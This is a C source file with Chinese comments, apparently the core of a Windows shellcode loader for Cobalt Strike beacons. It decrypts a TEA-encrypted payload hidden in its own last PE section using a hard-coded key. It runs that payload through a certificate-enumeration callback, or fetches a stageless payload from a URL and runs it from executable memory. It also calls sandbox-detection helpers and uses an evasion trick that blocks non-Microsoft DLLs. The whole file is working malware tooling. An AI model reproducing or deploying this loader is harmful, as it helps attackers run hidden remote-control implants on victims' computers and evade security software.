#include"bypass.h"
#include"stage.h"
#include <tlhelp32.h>
#include <Psapi.h>
#pragma comment(lib, "Crypt32.lib")
//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口
#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR")//合并区段

typedef void(*void_func_ptr)(void);

unsigned char jmp32bitOffset[] = {
    0xe9                                // jmp <32-bit immediate_offset>
};

#define	MagicValue			WORD

struct ConfigurationData {
	unsigned char*		shellcode;
	DWORD				shellcodeSize;
	IMAGE_DOS_HEADER	mDosHeader;
	MagicValue			wMagic;
	IMAGE_NT_HEADERS32	mNtHeader;
};

/*****数据包封装
* |STu8		|STu32			|STu8*		|
* |加密类型	|加密数据长度	|加密数据	|
******/

//加密类型
#define H_ENC_XOR	(unsigned char)(0xB1)
#define H_ENC_AES	(unsigned char)(0xB2)
#define H_ENC_RC4	(unsigned char)(0xB3)
#define H_ENC_TEA	(unsigned char)(0xB4)

/*****加密数据封装
* |STu8		|STu32			|STu8*		|
* |数据类型	|数据长度		|payload数据|
******/

//payload数据类型
#define P_TYPE_STAGE		(unsigned char)(0xA0)
#define P_TYPE_STAGELESSURL	(unsigned char)(0xA1)

/*****stage payload
* Conbalt strike分离木马方式生成的阶段一木马
******/

/*****stageless url
* Conbalt strike分离木马方式生成的阶段二木马url
* 根据阶段一木马解析得来
******/


//获取当前进程父进程
DWORD getParentPID(DWORD pid)
{
	HANDLE h = NULL;
	PROCESSENTRY32 pe = { 0 };
	DWORD ppid = 0;
	pe.dwSize = sizeof(PROCESSENTRY32);
	h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32First(h, &pe))
	{
		do
		{
			if (pe.th32ProcessID == pid)
			{
				ppid = pe.th32ParentProcessID;
				break;
			}
		} while (Process32Next(h, &pe));
	}
	CloseHandle(h);
	return (ppid);
}

//根据进程ID获取进程名
int getProcessName(DWORD pid, LPSTR fname, DWORD sz)
{
	HANDLE h = NULL;
	int e = 0;
	h = OpenProcess
	(
		PROCESS_QUERY_INFORMATION,
		FALSE,
		pid
	);
	if (h)
	{
		if (GetProcessImageFileName(h, fname, sz) == 0)
			e = GetLastError();
		CloseHandle(h);
	}
	else
	{
		e = GetLastError();
	}
	return (e);
}

//判断当前是否是子进程
bool GetPP()
{
	WORD pid, ppid;
	int e;
	char fname[MAX_PATH] = { 0 };
	pid = GetCurrentProcessId();
	ppid = getParentPID(pid);
	e = getProcessName(ppid, fname, MAX_PATH);
	char    processFullName[_MAX_PATH] = { 0 };
	GetProcessImageFileName(GetCurrentProcess(), processFullName, _MAX_PATH);
	//GetModuleFileNameA(NULL, processFullName, _MAX_PATH); //进程完整路径
	if (strcmp(fname, processFullName) == 0)
	{
		return true;
	}
	return false;
}

//tea解密
void decrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out)
{

	unsigned long code[4];
	register unsigned long n = 0x10, sum, y, z, delta = 0xab451fc4;

	sum = delta * n;
	y = htonl(in[0]);
	z = htonl(in[1]);

	code[0] = htonl(key[0]); code[1] = htonl(key[1]);
	code[2] = htonl(key[2]); code[3] = htonl(key[3]);

	while (n-- > 0)
	{
		z -= ((y >> 5) + code[3]) ^ ((y << 4) + code[2]) ^ (sum + y);
		y -= ((z >> 5) + code[1]) ^ ((z << 4) + code[0]) ^ (sum + z);
		sum -= delta;
	}
	out[0] = htonl(y);
	out[1] = htonl(z);
}

//自定义解密算法
void tea_decrypt(unsigned char* in, unsigned int inlen, unsigned char* key, unsigned char** out, unsigned int* outlen)
{
	unsigned char q[8], mkey[8], * q1, * q2, * outp;
	register int count, i, j, p;

	if (inlen % 8 || inlen < 16) return;
	/* get basic information of the packet */
	decrypt_tea((unsigned long*)in, (unsigned long*)key, (unsigned long*)q);
	j = q[0] & 0x7;
	count = inlen - j - 10;
	*outlen = count;
	*out = (unsigned char*)malloc(*outlen);
	if (*out == NULL) return;
	memset(*out, 0, *outlen);


	if (count < 0) return;

	memset(mkey, 0, 8);
	q2 = mkey;
	i = 8; p = 1;
	q1 = in + 8;
	j++;
	while (p <= 2)
	{
		if (j < 8)
		{
			j++;
			p++;
		}
		else if (j == 8)
		{
			q2 = in;
			for (j = 0; j < 8; j++)
			{
				if (i + j >= inlen) return;
				q[j] ^= q1[j];
			}
			decrypt_tea((unsigned long*)q, (unsigned long*)key,
				(unsigned long*)q);
			i += 8;
			q1 += 8;
			j = 0;
		}
	}
	outp = *out;
	while (count != 0)
	{
		if (j < 8)
		{
			outp[0] = q2[j] ^ q[j];
			outp++;
			count--;
			j++;
		}
		else if (j == 8)
		{
			q2 = q1 - 8;
			for (j = 0; j < 8; j++)
			{
				if (i + j >= inlen)
					return;
				q[j] ^= q1[j];
			}
			decrypt_tea((unsigned long*)q, (unsigned long*)key,
				(unsigned long*)q);
			i += 8;
			q1 += 8;
			j = 0;
		}
	}
	for (p = 1; p < 8; p++)
	{
		if (j < 8)
		{
			if (q2[j] ^ q[j])
				return;
			j++;
		}
		else if (j == 8)
		{
			q2 = q1;
			for (j = 0; j < 8; j++)
			{
				if (i + j >= inlen)
					return;
				q[j] ^= q1[j];
			}
			decrypt_tea((unsigned long*)q, (unsigned long*)key,
				(unsigned long*)q);
			i += 8;
			q1 += 8;
			j = 0;
		}
	}
}

//获取进程基地址
DWORD GetModuleBaseAddress(TCHAR* lpszModuleName, DWORD pID) { // Getting module base address
	DWORD dwModuleBaseAddress = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pID);
	MODULEENTRY32 ModuleEntry32 = { 0 };
	ModuleEntry32.dwSize = sizeof(MODULEENTRY32);

	if (Module32First(hSnapshot, &ModuleEntry32))
	{
		do {
			if (strcmp(ModuleEntry32.szModule, lpszModuleName) == 0)
			{
				dwModuleBaseAddress = (DWORD)ModuleEntry32.modBaseAddr;
				break;
			}
		} while (Module32Next(hSnapshot, &ModuleEntry32));
	}
	CloseHandle(hSnapshot);
	return dwModuleBaseAddress;
}

int GetSCPointerFromPE(struct ConfigurationData* config,unsigned int *scPointer,unsigned int *scSize)
{
	//获取当前进程加载基址
	char	fileName[100] = { 0 };
	char    processFullName[_MAX_PATH] = { 0 };
	char    processName[0x128] = { 0 };
	char* tmp1 = NULL;
	char* tmp2 = NULL;
	GetModuleFileNameA(NULL, processFullName, _MAX_PATH); //进程完整路径
	tmp1 = strrchr((char*)processFullName, '\\');
	memcpy(processName, tmp1 + 1, min(strlen(tmp1), sizeof(processName))); //截取得进程名
	DWORD   dwpid = GetCurrentProcessId();
	DWORD baseaddr = GetModuleBaseAddress(processName, dwpid);

	CopyMemory(&config->mDosHeader, (void*)baseaddr, sizeof(IMAGE_DOS_HEADER));
	//判断CPU字长
	DWORD dwVirtualAddress = config->mDosHeader.e_lfanew;
	dwVirtualAddress += sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER);
	CopyMemory(&config->wMagic, (void*)(baseaddr + dwVirtualAddress), sizeof(WORD));
	if (config->wMagic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) return -1;         //64位暂不支持
	CopyMemory(&config->mNtHeader, (void*)(baseaddr + config->mDosHeader.e_lfanew), sizeof(IMAGE_NT_HEADERS32));
	//解析区段
	dwVirtualAddress = config->mDosHeader.e_lfanew;
	dwVirtualAddress += sizeof(IMAGE_NT_HEADERS32);
	dwVirtualAddress += sizeof(IMAGE_SECTION_HEADER) * (config->mNtHeader.FileHeader.NumberOfSections - 1);
	IMAGE_SECTION_HEADER mSectionHeader;
	CopyMemory(&mSectionHeader, (void*)(baseaddr + dwVirtualAddress), sizeof(IMAGE_SECTION_HEADER));
	
	*scPointer = baseaddr + mSectionHeader.VirtualAddress;
	*scSize = mSectionHeader.SizeOfRawData;

	return 0;
}

int DecryptSC(struct ConfigurationData* config,unsigned char *encData,unsigned int encDataSize)
{
	if (encData[0] == H_ENC_XOR)
	{
		//xor解密
		/*unsigned char XOR_BYTES[] = { 0x56,0xb0,0x71,0xef,0xd7,0xe9,0x92,0x69,0x81,0xe9,0xb1,0x74,0x21,0x6d,0x8f,0x86 };
		unsigned int XOR_BYTES_LEN = sizeof(XOR_BYTES);
		for (int i = 0; i < mSectionHeader.SizeOfRawData; i++)
		{
			((unsigned char*)(baseaddr + mSectionHeader.VirtualAddress))[i] ^= XOR_BYTES[i % XOR_BYTES_LEN];
		}*/
	}
	else if (encData[0] == H_ENC_AES)
	{

	}
	else if (encData[0] == H_ENC_RC4)
	{

	}
	else if (encData[0] == H_ENC_TEA)
	{
		//解析头部
		int offset = 1 + 4;
		int encdatasize = *(unsigned int*)(encData + 1);

		//TEA加密
		unsigned char TEA_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
		tea_decrypt(encData + offset, encdatasize, TEA_KEY, &config->shellcode, (unsigned int*)&config->shellcodeSize);
		if (config->shellcode == NULL) {
			return -1;
		}
	}

	return 0;
}


//解析运行shellcode
int RunSCFromPE(struct ConfigurationData* config)
{
	unsigned int encData = 0;
	unsigned int encDataSize = 0;
	//解析PE结构，从区段获取SC
	GetSCPointerFromPE(config, &encData, &encDataSize);
	//解密SC
	if (DecryptSC(config, (unsigned char*)encData, &encDataSize)==0)
	{
		if (config->shellcode[0] == P_TYPE_STAGE)
		{
			//设置跳转代码
			int amtWritten = (sizeof(jmp32bitOffset) + sizeof(DWORD));
			DWORD jumpOffset = 5;
			jumpOffset -= amtWritten;
			memcpy((void*)encData, jmp32bitOffset, sizeof(jmp32bitOffset));
			DWORD* jumpTarget = (DWORD*)(encData + sizeof(jmp32bitOffset));
			*jumpTarget = jumpOffset;

			//执行shellcode代码
			void_func_ptr callLoc = (void_func_ptr)(encData);
			//callLoc();
			//EnumWindows((WNDENUMPROC)(callLoc), 0);
			//EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)callLoc, LGRPID_INSTALLED, NULL);

			CertEnumSystemStore(0x10000, 0, "system", (PFN_CERT_ENUM_SYSTEM_STORE)callLoc);
		}
		else if (config->shellcode[0] == P_TYPE_STAGELESSURL)
		{
			unsigned int urllen = *(unsigned int*)(config->shellcode + 1);
			unsigned char* url = malloc(urllen + 1);
			if (url)
			{
				//解析url
				memset(url, 0, urllen + 1);
				memcpy(url, config->shellcode + 1 + 4, urllen);
				GetStageless(url, &config->shellcode, &config->shellcodeSize);
				free(url);
				unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
				if (dwBaseAddr)
				{
					memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
					free(config->shellcode);
					DWORD oldpro = PAGE_READWRITE;
					if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
						((void(*)())dwBaseAddr)();
				}
			}
			else
				return -1;
		}
		return 0;
	}
	return -1;
}

int main()
{
	ForBD();
	
	struct ConfigurationData config;
	memset(&config, 0, sizeof(struct ConfigurationData));

	if (ForSD())
	{
		return 0;
	}
	
	if (/*GetPP()*/true)
	{
		//自身子进程
		if (RunSCFromPE(&config) < 0) {
			return 1;
		}
	}
	else
	{
		//未创建子进程
		STARTUPINFOEXA si;
		PROCESS_INFORMATION pi;
		SIZE_T size = 0;
		BOOL ret;

		// 请求一个 STARTUPINFOEXA 结构体
		ZeroMemory(&si, sizeof(si));
		si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
		si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

		//获取要分配的 PROC_THREAD_ATTRIBUTE_LIST 大小
		InitializeProcThreadAttributeList(NULL, 1, 0, &size);

		//为 PROC_THREAD_ATTRIBUTE_LIST 分配内存
		si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
			GetProcessHeap(),
			0,
			size
		);

		// 初始化我们的列表 
		InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);

		// 启用阻止未经Microsoft签名的DLL功能
		DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

		// Assign our attribute
		UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

		//修改父进程
		//HANDLE handle = GetCurrentProcess();
		//if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &handle, sizeof(HANDLE), NULL, NULL)) {
		//	return 0;
		//}
		
		// 创建进程
		char    processFullName[_MAX_PATH] = { 0 };
		GetModuleFileNameA(NULL, processFullName, _MAX_PATH); //进程完整路径
		ret = CreateProcessA(
			NULL,
			(LPSTR)processFullName,
			NULL,
			NULL,
			true,
			EXTENDED_STARTUPINFO_PRESENT,
			NULL,
			NULL,
			(LPSTARTUPINFOA)(&si),
			&pi
		);
		WaitForSingleObject(pi.hProcess, INFINITE);
	}

	return 0;
}

